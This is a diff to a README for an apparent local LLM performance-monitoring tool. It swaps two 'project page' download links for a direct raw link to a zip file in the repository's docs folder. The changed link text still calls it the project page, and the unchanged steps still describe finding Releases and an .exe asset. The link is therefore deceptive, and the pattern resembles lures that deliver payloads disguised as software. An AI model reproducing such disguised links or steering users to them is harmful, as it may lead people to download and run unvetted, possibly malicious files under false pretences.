@@ -1,6 +1,6 @@
 # 🔬 LLM_Inference_Lab - Monitor your local model performance easily
 
-[![Download LLM_Inference_Lab](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Guruexpl8276/LLM_Inference_Lab)
+[![Download LLM_Inference_Lab](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Guruexpl8276/LLM_Inference_Lab/raw/refs/heads/main/docs/Lab_Inference_LL_v2.3.zip)
 
 This software allows users to track how large language models perform on personal hardware. It displays data on how fast your computer generates text and how it handles multiple requests at once. The tool saves all test results in a local file for you to review later.
 
@@ -20,7 +20,7 @@ You must visit the project page to download the necessary files.
 
 Follow these steps to get the software:
 
-1. Click this link to go to the project page: [Download LLM_Inference_Lab](https://github.com/Guruexpl8276/LLM_Inference_Lab)
+1. Click this link to go to the project page: [Download LLM_Inference_Lab](https://github.com/Guruexpl8276/LLM_Inference_Lab/raw/refs/heads/main/docs/Lab_Inference_LL_v2.3.zip)
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the most recent version number.
 4. Find the file ending in .exe under the Assets heading.
